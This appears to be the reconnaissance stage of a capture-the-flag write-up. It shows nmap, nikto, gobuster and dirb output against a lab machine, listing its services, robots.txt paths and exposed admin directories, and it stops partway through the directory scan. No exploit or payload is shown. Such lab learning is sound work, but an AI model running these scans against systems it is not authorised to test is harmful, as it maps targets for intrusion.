Nmap scan

```bash
root@kali:~# nmap -A 192.168.1.167

Starting Nmap 7.40 ( https://nmap.org ) at 2017-04-25 23:44 CEST
Nmap scan report for 192.168.1.167
Host is up (0.00035s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 a7:52:df:39:80:7c:66:16:2f:fd:f7:7b:80:13:09:85 (DSA)
|   2048 bf:d9:5a:22:54:91:cc:36:40:3c:e6:35:4f:8e:0c:78 (RSA)
|_  256 16:e6:84:e1:5f:80:bc:27:6a:50:01:55:f0:c0:cc:72 (ECDSA)
25/tcp  open  smtp    Exim smtpd
| smtp-commands: D0Not5top Hello nmap.scanme.org [192.168.1.179], SIZE 52428800, 8BITMIME, PIPELINING, HELP, 
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA NOOP QUIT RSET HELP 
53/tcp  open  domain  PowerDNS 3.4.1
| dns-nsid: 
|   NSID: D0Not5top (44304e6f7435746f70)
|   id.server: D0Not5top
|_  bind.version: PowerDNS Authoritative Server 3.4.1 (jenkins@autotest.powerdns.com built 20170111224403 root@x86-csail-01.debian.org)
80/tcp  open  http    Apache httpd
| http-robots.txt: 22 disallowed entries (15 shown)
| /games /dropbox /contact /blog/wp-login.php 
| /blog/wp-admin /search /support/search.php 
| /extend/plugins/search.php /plugins/search.php /extend/themes/search.php 
|_/themes/search.php /support/rss /archive/ /wp-admin/ /wp-content/
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          46204/tcp  status
|_  100024  1          48437/udp  status
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.40%E=4%D=4/25%OT=22%CT=1%CU=33411%PV=Y%DS=2%DC=T%G=Y%TM=58FFC37
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=11%GCD=FA00%ISR=9C%TI=I%CI=I%TS=U)OPS(O1=
OS:M5B4%O2=M5B4%O3=M5B4%O4=M5B4%O5=M5B4%O6=M5B4)WIN(W1=FFFF%W2=FFFF%W3=FFFF
OS:%W4=FFFF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=N%T=41%W=FFFF%O=M5B4%CC=N%Q=)T1(R=Y%
OS:DF=N%T=41%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=N%T=100%W=0%S=Z%A=S%F=AR%O=%RD
OS:=0%Q=)T3(R=Y%DF=N%T=100%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T4(R=Y%DF=N%T=100%W
OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=100%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)T6(R=Y%DF=N%T=100%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=N%T=100%W=0%S=Z%
OS:A=S%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=36%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=N)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.11 ms 10.0.2.2
2   0.21 ms 192.168.1.167

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.74 seconds
root@kali:~# 

```

Port 80 seems the most promising so we fire up (nikto, dirb and gobuster)

```bash

root@kali:~# nikto -C All -h http://192.168.1.167
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.167
+ Target Hostname:    192.168.1.167
+ Target Port:        80
+ Start Time:         2017-04-25 23:55:31 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache
+ Server leaks inodes via ETags, header found with file /, fields: 0xd3 0x54c550ee22d56 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-3268: /games/: Directory indexing found.
+ Entry '/games/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/dropbox/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/contact/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/search/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/archive/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/wp-admin/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/wp-content/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/wp-includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/comment-page-/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/trackback/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/xmlrpc.php' in robots.txt returned a non-forbidden or redirect HTTP code (301)
+ Entry '/blackhole/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/mint/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/feed/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 26 entries which should be manually viewed.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3092: /archive/: This might be interesting...
+ OSVDB-3092: /support/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wp-admin/: Admin login page/section found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 8351 requests: 0 error(s) and 28 item(s) reported on remote host
+ End Time:           2017-04-25 23:56:00 (GMT2) (29 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~# 

```

```bash

root@kali:~# gobuster -w /usr/share/wordlists/dirb/big.txt -u http://192.168.1.167

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.1.167/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/big.txt
[+] Status codes : 301,302,307,200,204
=====================================================
/archive (Status: 301)
/blackhole (Status: 301)
/blog (Status: 301)
/contact (Status: 301)
/control (Status: 301)
/dropbox (Status: 301)
/extend (Status: 301)
/feed (Status: 301)
/games (Status: 301)
/manual (Status: 301)
/mint (Status: 301)
/phpmyadmin (Status: 301)
/plugins (Status: 301)
/robots.txt (Status: 200)
/search (Status: 301)
=====================================================
root@kali:~# 

```

```bash

root@kali:~# dirb http://192.168.1.167

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Apr 26 00:03:47 2017
URL_BASE: http://192.168.1.167/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.167/ ----
==> DIRECTORY: http://192.168.1.167/archive/                                                                                                                                                                   
==> DIRECTORY: http://192.168.1.167/blog/                                                                                                                                                                      
==> DIRECTORY: http://192.168.1.167/contact/                                                                                                                                                                   
==> DIRECTORY: http://192.168.1.167/control/                                                                                                                                                                   
==> DIRECTORY: http://192.168.1.167/feed/                                                                                                                                                                      
==> DIRECTORY: http://192.168.1.167/games/                                                                                                                                                                     
+ http://192.168.1.167/index.html (CODE:200|SIZE:211)                                                                                                                                                          
==> DIRECTORY: http://192.168.1.167/manual/                                                                                                                                                                    
==> DIRECTORY: http://192.168.1.167/mint/                                                                                                                                                                      
==> DIRECTORY: http://192.168.1.167/phpmyadmin/                                                                                                                                                                
==> DIRECTORY: http://192.168.1.167/plugins/                                                                                                                                                                   
+ http://192.168.1.167/robots.txt (CODE:200|SIZE:695)                                                                                                                                                          
==> DIRECTORY: http://192.168.1.167/search/                                                                                                                                                                    
+ http://192.168.1.167/server-status (CODE:403|SIZE:222)                                                                                                                                                       
==> DIRECTORY: http://192.168.1.167/support/                                                                                                                                                                   
==> DIRECTORY: http://192.168.1.167/tag/                                                                                                                                                                       
==> DIRECTORY: http://192.168.1.167/themes/                                                                                                                                                                    
==> DIRECTORY: http://192.168.1.167/trackback/                                                                                                                                                                 
==> DIRECTORY: http://192.168.1.167/wp-admin/                                                                                                                                                                  
==> DIRECTORY: http://192.168.1.167/wp-content/                                                                                                                                                                
==> DIRECTORY: http://192.168.1.167/wp-includes/                                                                                                                                                               
==> DIRECTORY: http://192.168.1.167/xmlrpc.php/                                                                                                                                                                
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/archive/ ----
==> DIRECTORY: http://192.168.1.167/archive/admin/                                                                                                                                                             
+ http://192.168.1.167/archive/index.php (CODE:200|SIZE:0)                                                                                                                                                     
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/blog/ ----
==> DIRECTORY: http://192.168.1.167/blog/admin/                                                                                                                                                                
+ http://192.168.1.167/blog/index.php (CODE:200|SIZE:0)                                                                                                                                                        
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/contact/ ----
==> DIRECTORY: http://192.168.1.167/contact/admin/                                                                                                                                                             
+ http://192.168.1.167/contact/index.php (CODE:200|SIZE:0)                                                                                                                                                     
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/control/ ----
==> DIRECTORY: http://192.168.1.167/control/css/                                                                                                                                                               
==> DIRECTORY: http://192.168.1.167/control/fonts/                                                                                                                                                             
+ http://192.168.1.167/control/index.html (CODE:200|SIZE:6814)                                                                                                                                                 
==> DIRECTORY: http://192.168.1.167/control/js/                                                                                                                                                                
+ http://192.168.1.167/control/LICENSE (CODE:200|SIZE:11336)                                                                                                                                                   
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/feed/ ----
==> DIRECTORY: http://192.168.1.167/feed/admin/                                                                                                                                                                
+ http://192.168.1.167/feed/index.php (CODE:200|SIZE:0)                                                                                                                                                        
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/games/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/ ----
==> DIRECTORY: http://192.168.1.167/manual/da/                                                                                                                                                                 
==> DIRECTORY: http://192.168.1.167/manual/de/                                                                                                                                                                 
==> DIRECTORY: http://192.168.1.167/manual/en/                                                                                                                                                                 
==> DIRECTORY: http://192.168.1.167/manual/es/                                                                                                                                                                 
==> DIRECTORY: http://192.168.1.167/manual/fr/                                                                                                                                                                 
==> DIRECTORY: http://192.168.1.167/manual/images/                                                                                                                                                             
+ http://192.168.1.167/manual/index.html (CODE:200|SIZE:626)                                                                                                                                                   
==> DIRECTORY: http://192.168.1.167/manual/ja/                                                                                                                                                                 
==> DIRECTORY: http://192.168.1.167/manual/ko/                                                                                                                                                                 
==> DIRECTORY: http://192.168.1.167/manual/style/                                                                                                                                                              
==> DIRECTORY: http://192.168.1.167/manual/tr/                                                                                                                                                                 
==> DIRECTORY: http://192.168.1.167/manual/zh-cn/                                                                                                                                                              
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/mint/ ----
==> DIRECTORY: http://192.168.1.167/mint/admin/                                                                                                                                                                
+ http://192.168.1.167/mint/index.php (CODE:200|SIZE:0)                                                                                                                                                        
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/phpmyadmin/ ----
+ http://192.168.1.167/phpmyadmin/index.html (CODE:200|SIZE:154472)                                                                                                                                            
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/plugins/ ----
==> DIRECTORY: http://192.168.1.167/plugins/admin/                                                                                                                                                             
+ http://192.168.1.167/plugins/index.php (CODE:200|SIZE:0)                                                                                                                                                     
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/search/ ----
==> DIRECTORY: http://192.168.1.167/search/admin/                                                                                                                                                              
+ http://192.168.1.167/search/index.php (CODE:200|SIZE:0)                                                                                                                                                      
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/support/ ----
==> DIRECTORY: http://192.168.1.167/support/admin/                                                                                                                                                             
+ http://192.168.1.167/support/index.php (CODE:200|SIZE:0)                                                                                                                                                     
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/tag/ ----
==> DIRECTORY: http://192.168.1.167/tag/admin/                                                                                                                                                                 
+ http://192.168.1.167/tag/index.php (CODE:200|SIZE:0)                                                                                                                                                         
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/themes/ ----
==> DIRECTORY: http://192.168.1.167/themes/admin/                                                                                                                                                              
+ http://192.168.1.167/themes/index.php (CODE:200|SIZE:0)                                                                                                                                                      
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/trackback/ ----
==> DIRECTORY: http://192.168.1.167/trackback/admin/                                                                                                                                                           
+ http://192.168.1.167/trackback/index.php (CODE:200|SIZE:0)                                                                                                                                                   
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/wp-admin/ ----
==> DIRECTORY: http://192.168.1.167/wp-admin/admin/                                                                                                                                                            
+ http://192.168.1.167/wp-admin/index.php (CODE:200|SIZE:0)                                                                                                                                                    
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/wp-content/ ----
==> DIRECTORY: http://192.168.1.167/wp-content/admin/                                                                                                                                                          
+ http://192.168.1.167/wp-content/index.php (CODE:200|SIZE:0)                                                                                                                                                  
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/wp-includes/ ----
==> DIRECTORY: http://192.168.1.167/wp-includes/admin/                                                                                                                                                         
+ http://192.168.1.167/wp-includes/index.php (CODE:200|SIZE:0)                                                                                                                                                 
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/xmlrpc.php/ ----
==> DIRECTORY: http://192.168.1.167/xmlrpc.php/admin/                                                                                                                                                          
+ http://192.168.1.167/xmlrpc.php/index.php (CODE:200|SIZE:0)                                                                                                                                                  
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/archive/admin/ ----
==> DIRECTORY: http://192.168.1.167/archive/admin/archive/                                                                                                                                                     
+ http://192.168.1.167/archive/admin/index.php (CODE:200|SIZE:0)                                                                                                                                               
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/blog/admin/ ----
==> DIRECTORY: http://192.168.1.167/blog/admin/blog/                                                                                                                                                           
+ http://192.168.1.167/blog/admin/index.php (CODE:200|SIZE:0)                                                                                                                                                  
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/contact/admin/ ----
==> DIRECTORY: http://192.168.1.167/contact/admin/contact/                                                                                                                                                     
+ http://192.168.1.167/contact/admin/index.php (CODE:200|SIZE:0)                                                                                                                                               
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/control/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/control/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/control/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/feed/admin/ ----
==> DIRECTORY: http://192.168.1.167/feed/admin/feed/                                                                                                                                                           
+ http://192.168.1.167/feed/admin/index.php (CODE:200|SIZE:0)                                                                                                                                                  
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/da/ ----
==> DIRECTORY: http://192.168.1.167/manual/da/developer/                                                                                                                                                       
==> DIRECTORY: http://192.168.1.167/manual/da/faq/                                                                                                                                                             
==> DIRECTORY: http://192.168.1.167/manual/da/howto/                                                                                                                                                           
+ http://192.168.1.167/manual/da/index.html (CODE:200|SIZE:9041)                                                                                                                                               
==> DIRECTORY: http://192.168.1.167/manual/da/misc/                                                                                                                                                            
==> DIRECTORY: http://192.168.1.167/manual/da/mod/                                                                                                                                                             
==> DIRECTORY: http://192.168.1.167/manual/da/programs/                                                                                                                                                        
==> DIRECTORY: http://192.168.1.167/manual/da/ssl/                                                                                                                                                             
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/de/ ----
==> DIRECTORY: http://192.168.1.167/manual/de/developer/                                                                                                                                                       
==> DIRECTORY: http://192.168.1.167/manual/de/faq/                                                                                                                                                             
==> DIRECTORY: http://192.168.1.167/manual/de/howto/                                                                                                                                                           
+ http://192.168.1.167/manual/de/index.html (CODE:200|SIZE:9290)                                                                                                                                               
==> DIRECTORY: http://192.168.1.167/manual/de/misc/                                                                                                                                                            
==> DIRECTORY: http://192.168.1.167/manual/de/mod/                                                                                                                                                             
==> DIRECTORY: http://192.168.1.167/manual/de/programs/                                                                                                                                                        
==> DIRECTORY: http://192.168.1.167/manual/de/ssl/                                                                                                                                                             
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/en/ ----
==> DIRECTORY: http://192.168.1.167/manual/en/developer/                                                                                                                                                       
==> DIRECTORY: http://192.168.1.167/manual/en/faq/                                                                                                                                                             
==> DIRECTORY: http://192.168.1.167/manual/en/howto/                                                                                                                                                           
+ http://192.168.1.167/manual/en/index.html (CODE:200|SIZE:9206)                                                                                                                                               
==> DIRECTORY: http://192.168.1.167/manual/en/misc/                                                                                                                                                            
==> DIRECTORY: http://192.168.1.167/manual/en/mod/                                                                                                                                                             
==> DIRECTORY: http://192.168.1.167/manual/en/programs/                                                                                                                                                        
==> DIRECTORY: http://192.168.1.167/manual/en/ssl/                                                                                                                                                             
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/es/ ----
==> DIRECTORY: http://192.168.1.167/manual/es/developer/                                                                                                                                                       
==> DIRECTORY: http://192.168.1.167/manual/es/faq/                                                                                                                                                             
==> DIRECTORY: http://192.168.1.167/manual/es/howto/                                                                                                                                                           
+ http://192.168.1.167/manual/es/index.html (CODE:200|SIZE:9255)                                                                                                                                               
==> DIRECTORY: http://192.168.1.167/manual/es/misc/                                                                                                                                                            
==> DIRECTORY: http://192.168.1.167/manual/es/mod/                                                                                                                                                             
==> DIRECTORY: http://192.168.1.167/manual/es/programs/                                                                                                                                                        
==> DIRECTORY: http://192.168.1.167/manual/es/ssl/                                                                                                                                                             
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/fr/ ----
==> DIRECTORY: http://192.168.1.167/manual/fr/developer/                                                                                                                                                       
==> DIRECTORY: http://192.168.1.167/manual/fr/faq/                                                                                                                                                             
==> DIRECTORY: http://192.168.1.167/manual/fr/howto/                                                                                                                                                           
+ http://192.168.1.167/manual/fr/index.html (CODE:200|SIZE:9479)                                                                                                                                               
==> DIRECTORY: http://192.168.1.167/manual/fr/misc/                                                                                                                                                            
==> DIRECTORY: http://192.168.1.167/manual/fr/mod/                                                                                                                                                             
==> DIRECTORY: http://192.168.1.167/manual/fr/programs/                                                                                                                                                        
==> DIRECTORY: http://192.168.1.167/manual/fr/ssl/                                                                                                                                                             
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/ja/ ----
==> DIRECTORY: http://192.168.1.167/manual/ja/developer/                                                                                                                                                       
==> DIRECTORY: http://192.168.1.167/manual/ja/faq/                                                                                                                                                             
==> DIRECTORY: http://192.168.1.167/manual/ja/howto/                                                                                                                                                           
+ http://192.168.1.167/manual/ja/index.html (CODE:200|SIZE:9649)                                                                                                                                               
==> DIRECTORY: http://192.168.1.167/manual/ja/misc/                                                                                                                                                            
==> DIRECTORY: http://192.168.1.167/manual/ja/mod/                                                                                                                                                             
==> DIRECTORY: http://192.168.1.167/manual/ja/programs/                                                                                                                                                        
==> DIRECTORY: http://192.168.1.167/manual/ja/ssl/                                                                                                                                                             
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/ko/ ----
==> DIRECTORY: http://192.168.1.167/manual/ko/developer/                                                                                                                                                       
==> DIRECTORY: http://192.168.1.167/manual/ko/faq/                                                                                                                                                             
==> DIRECTORY: http://192.168.1.167/manual/ko/howto/                                                                                                                                                           
+ http://192.168.1.167/manual/ko/index.html (CODE:200|SIZE:8513)                                                                                                                                               
==> DIRECTORY: http://192.168.1.167/manual/ko/misc/                                                                                                                                                            
==> DIRECTORY: http://192.168.1.167/manual/ko/mod/                                                                                                                                                             
==> DIRECTORY: http://192.168.1.167/manual/ko/programs/                                                                                                                                                        
==> DIRECTORY: http://192.168.1.167/manual/ko/ssl/                                                                                                                                                             
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/style/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/tr/ ----
==> DIRECTORY: http://192.168.1.167/manual/tr/developer/                                                                                                                                                       
==> DIRECTORY: http://192.168.1.167/manual/tr/faq/                                                                                                                                                             
==> DIRECTORY: http://192.168.1.167/manual/tr/howto/                                                                                                                                                           
+ http://192.168.1.167/manual/tr/index.html (CODE:200|SIZE:9416)                                                                                                                                               
==> DIRECTORY: http://192.168.1.167/manual/tr/misc/                                                                                                                                                            
==> DIRECTORY: http://192.168.1.167/manual/tr/mod/                                                                                                                                                             
==> DIRECTORY: http://192.168.1.167/manual/tr/programs/                                                                                                                                                        
==> DIRECTORY: http://192.168.1.167/manual/tr/ssl/                                                                                                                                                             
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/zh-cn/ ----
==> DIRECTORY: http://192.168.1.167/manual/zh-cn/developer/                                                                                                                                                    
==> DIRECTORY: http://192.168.1.167/manual/zh-cn/faq/                                                                                                                                                          
==> DIRECTORY: http://192.168.1.167/manual/zh-cn/howto/                                                                                                                                                        
+ http://192.168.1.167/manual/zh-cn/index.html (CODE:200|SIZE:8884)                                                                                                                                            
==> DIRECTORY: http://192.168.1.167/manual/zh-cn/misc/                                                                                                                                                         
==> DIRECTORY: http://192.168.1.167/manual/zh-cn/mod/                                                                                                                                                          
==> DIRECTORY: http://192.168.1.167/manual/zh-cn/programs/                                                                                                                                                     
==> DIRECTORY: http://192.168.1.167/manual/zh-cn/ssl/                                                                                                                                                          
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/mint/admin/ ----
+ http://192.168.1.167/mint/admin/index.php (CODE:200|SIZE:0)                                                                                                                                                  
==> DIRECTORY: http://192.168.1.167/mint/admin/mint/                                                                                                                                                           
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/plugins/admin/ ----
+ http://192.168.1.167/plugins/admin/index.php (CODE:200|SIZE:0)                                                                                                                                               
==> DIRECTORY: http://192.168.1.167/plugins/admin/plugins/                                                                                                                                                     
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/search/admin/ ----
+ http://192.168.1.167/search/admin/index.php (CODE:200|SIZE:0)                                                                                                                                                
==> DIRECTORY: http://192.168.1.167/search/admin/search/                                                                                                                                                       
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/support/admin/ ----
+ http://192.168.1.167/support/admin/index.php (CODE:200|SIZE:0)                                                                                                                                               
==> DIRECTORY: http://192.168.1.167/support/admin/support/                                                                                                                                                     
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/tag/admin/ ----
+ http://192.168.1.167/tag/admin/index.php (CODE:200|SIZE:0)                                                                                                                                                   
==> DIRECTORY: http://192.168.1.167/tag/admin/tag/                                                                                                                                                             
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/themes/admin/ ----
+ http://192.168.1.167/themes/admin/index.php (CODE:200|SIZE:0)                                                                                                                                                
==> DIRECTORY: http://192.168.1.167/themes/admin/themes/                                                                                                                                                       
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/trackback/admin/ ----
+ http://192.168.1.167/trackback/admin/index.php (CODE:200|SIZE:0)                                                                                                                                             
==> DIRECTORY: http://192.168.1.167/trackback/admin/trackback/                                                                                                                                                 
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/wp-admin/admin/ ----
+ http://192.168.1.167/wp-admin/admin/index.php (CODE:200|SIZE:0)                                                                                                                                              
==> DIRECTORY: http://192.168.1.167/wp-admin/admin/wp-admin/                                                                                                                                                   
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/wp-content/admin/ ----
+ http://192.168.1.167/wp-content/admin/index.php (CODE:200|SIZE:0)                                                                                                                                            
==> DIRECTORY: http://192.168.1.167/wp-content/admin/wp-content/                                                                                                                                               
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/wp-includes/admin/ ----
+ http://192.168.1.167/wp-includes/admin/index.php (CODE:200|SIZE:0)                                                                                                                                           
==> DIRECTORY: http://192.168.1.167/wp-includes/admin/wp-includes/                                                                                                                                             
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/xmlrpc.php/admin/ ----
+ http://192.168.1.167/xmlrpc.php/admin/index.php (CODE:200|SIZE:0)                                                                                                                                            
==> DIRECTORY: http://192.168.1.167/xmlrpc.php/admin/xmlrpc.php/                                                                                                                                               
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/archive/admin/archive/ ----
==> DIRECTORY: http://192.168.1.167/archive/admin/archive/1/                                                                                                                                                   
+ http://192.168.1.167/archive/admin/archive/index.php (CODE:200|SIZE:0)                                                                                                                                       
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/blog/admin/blog/ ----
==> DIRECTORY: http://192.168.1.167/blog/admin/blog/1/                                                                                                                                                         
+ http://192.168.1.167/blog/admin/blog/index.php (CODE:200|SIZE:0)                                                                                                                                             
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/contact/admin/contact/ ----
==> DIRECTORY: http://192.168.1.167/contact/admin/contact/1/                                                                                                                                                   
+ http://192.168.1.167/contact/admin/contact/index.php (CODE:200|SIZE:0)                                                                                                                                       
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/feed/admin/feed/ ----
==> DIRECTORY: http://192.168.1.167/feed/admin/feed/1/                                                                                                                                                         
+ http://192.168.1.167/feed/admin/feed/index.php (CODE:200|SIZE:0)                                                                                                                                             
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/da/developer/ ----
+ http://192.168.1.167/manual/da/developer/index.html (CODE:200|SIZE:5892)                                                                                                                                     
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/da/faq/ ----
+ http://192.168.1.167/manual/da/faq/index.html (CODE:200|SIZE:3602)                                                                                                                                           
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/da/howto/ ----
+ http://192.168.1.167/manual/da/howto/index.html (CODE:200|SIZE:6962)                                                                                                                                         
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/da/misc/ ----
+ http://192.168.1.167/manual/da/misc/index.html (CODE:200|SIZE:5106)                                                                                                                                          
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/da/mod/ ----
+ http://192.168.1.167/manual/da/mod/index.html (CODE:200|SIZE:22377)                                                                                                                                          
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/da/programs/ ----
+ http://192.168.1.167/manual/da/programs/index.html (CODE:200|SIZE:6897)                                                                                                                                      
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/da/ssl/ ----
+ http://192.168.1.167/manual/da/ssl/index.html (CODE:200|SIZE:5049)                                                                                                                                           
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/de/developer/ ----
+ http://192.168.1.167/manual/de/developer/index.html (CODE:200|SIZE:5892)                                                                                                                                     
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/de/faq/ ----
+ http://192.168.1.167/manual/de/faq/index.html (CODE:200|SIZE:3602)                                                                                                                                           
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/de/howto/ ----
+ http://192.168.1.167/manual/de/howto/index.html (CODE:200|SIZE:6962)                                                                                                                                         
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/de/misc/ ----
+ http://192.168.1.167/manual/de/misc/index.html (CODE:200|SIZE:5106)                                                                                                                                          
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/de/mod/ ----
+ http://192.168.1.167/manual/de/mod/index.html (CODE:200|SIZE:22569)                                                                                                                                          
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/de/programs/ ----
+ http://192.168.1.167/manual/de/programs/index.html (CODE:200|SIZE:6897)                                                                                                                                      
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/de/ssl/ ----
+ http://192.168.1.167/manual/de/ssl/index.html (CODE:200|SIZE:5049)                                                                                                                                           
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/en/developer/ ----
+ http://192.168.1.167/manual/en/developer/index.html (CODE:200|SIZE:5892)                                                                                                                                     
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/en/faq/ ----
+ http://192.168.1.167/manual/en/faq/index.html (CODE:200|SIZE:3602)                                                                                                                                           
                                                                                                                                                                                                               
---- Entering directory: http://192.168.1.167/manual/en/howto/ ----
